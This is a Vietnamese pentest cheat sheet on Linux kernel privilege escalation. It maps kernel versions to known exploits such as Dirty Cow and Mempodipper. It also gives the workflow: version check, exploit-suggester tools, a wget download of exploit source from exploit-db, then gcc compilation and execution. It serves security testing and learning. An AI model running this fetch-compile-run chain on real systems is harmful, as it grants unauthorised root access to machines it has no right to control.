# Kernel Exploits

## Điểm chính khai thác

* Khai thác các lỗi trong kernel Linux để nâng quyền từ người dùng thường lên root, tận dụng các lỗ hổng như quản lý bộ nhớ sai, race conditions, hoặc cấu hình kernel không an toàn
* Thường thấy ở hệ thống chưa vá hoặc dùng phiên bản kernel cũ, phù hợp cho môi trường kế thừa hoặc thử nghiệm
* Danh sách các lỗ hổng kernel phổ biến và phiên bản bị ảnh hưởng:
  * **Kernel 2.4.x / 2.6.x**: `sock_sendpage`&#x20;
  * **Kernel < 2.6.22**: `ftruncate`
  * **Kernel < 2.6.34**: `cap_sys_admin`
  * **Kernel 2.6.27 < 2.6.36**: `compat`
  * **Kernel < 2.6.36-rc1**: `can bcm`
  * **Kernel <= 2.6.36-rc8**: `rds protocol`
  * **Kernel < 2.6.36.2**: `half nelson`
  * **Kernel <= 2.6.37**: `full nelson`
  * **Kernel 2.6**: `udev`
  * **Kernel 3.13**: `sgid`
  * **Kernel 3.13.0 < 3.19**: `overlayfs`&#x20;
  * **Kernel 3.14.5**: `libfutex`
  * **Kernel 2.6.39 <= 3.2.2**: `mempodipper`
  * **Kernel 2.6.28 / 3.0**: `alpha-omega`
  * **Kernel 2.6.22 < 3.9**: `Dirty Cow`
  * **Kernel 3.7.6**: `msr`
  * **Kernel < 3.8.9**: `perf_swevent_init`
  * **Kernel <= 4.3.3**: `overlayfs`&#x20;
  * **Kernel 4.3.3**: `overlayfs`&#x20;
  * **Kernel 4.4.0**: `af_packet`
  * **Kernel 4.4.x**: `double-fdput`
  * **Kernel 4.4.0-21**: `netfilter`
  * **Kernel 4.4.1**: `refcount`

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Hiển thị phiên bản kernel hiện tại để xác định các lỗ hổng khai thác tiềm năng:

```
uname -r
```

Output mong đợi: Phiên bản kernel, ví dụ: `3.2.0-23-generic`

#### Kiểm tra quyền truy cập hoặc cấu hình

Phân tích kernel và đề xuất các khai thác dựa trên phiên bản, đồng thời xác định lỗ hổng phù hợp:

```
./linux-exploit-suggester
```

Kiểm tra cấu hình hệ thống và kernel để tìm điểm yếu leo thang đặc quyền:

```
./unix_privesc_check
```

#### Phân tích ngữ cảnh thực thi

So sánh phiên bản kernel với danh sách lỗ hổng đã biết (xem Điểm chính khai thác) để đảm bảo chọn khai thác đúng

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tải mã nguồn khai thác và biên dịch để chuẩn bị tệp thực thi:

```
wget -O exploit.c http://www.exploit-db.com/download/XXXXX
```

Biên dịch chuẩn cho khai thác 32-bit:

```
gcc -m32 -o output32 exploit.c
```

Biên dịch chuẩn cho khai thác 64-bit:

```
gcc -m64 -o output exploit.c
```

#### Áp dụng khai thác

Chạy khai thác Mempodipper để leo thang đặc quyền:

```
./<exploit>
```

{% hint style="info" %}
Kiểm tra tài liệu khai thác để biết tham số cần thiết. Thử trong môi trường ảo để tránh crash.
{% endhint %}
